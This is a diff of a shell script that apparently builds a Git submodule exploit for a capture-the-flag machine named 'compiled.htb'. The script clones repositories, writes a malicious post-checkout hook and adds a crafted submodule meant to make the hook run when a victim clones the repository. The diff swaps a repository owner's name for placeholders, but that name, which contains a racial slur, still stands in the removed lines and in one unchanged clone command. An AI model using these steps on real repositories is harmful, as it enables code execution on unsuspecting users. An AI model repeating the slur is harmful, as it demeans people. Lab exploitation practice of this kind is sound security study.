@@ -7,7 +7,7 @@ git config --global init.defaultBranch main
 rm -rf repo1
 rm -rf repo2
 
-git clone http://gitea.compiled.htb:3000/celesian_nlte_cheating_niggers/repo1.git
+git clone http://gitea.compiled.htb:3000/xxxxxxxxx/repo1.git
 cd repo1
 mkdir -p y/hooks
 cat > y/hooks/post-checkout <<EOF
@@ -22,7 +22,7 @@ cd ..
 
 git clone http://gitea.compiled.htb:3000/celesian_nlte_cheating_niggers/repo2.git
 cd repo2
-git submodule add --name x/y "http://gitea.compiled.htb:3000/celesian_nlte_cheating_niggers/repo1.git" A/modules/x
+git submodule add --name x/y "http://gitea.compiled.htb:3000/xxxxxxxxxx/repo1.git" A/modules/x
 git commit -m "add-submodule"
 printf ".git" > dotgit.txt
 git hash-object -w --stdin < dotgit.txt > dot-git.hash
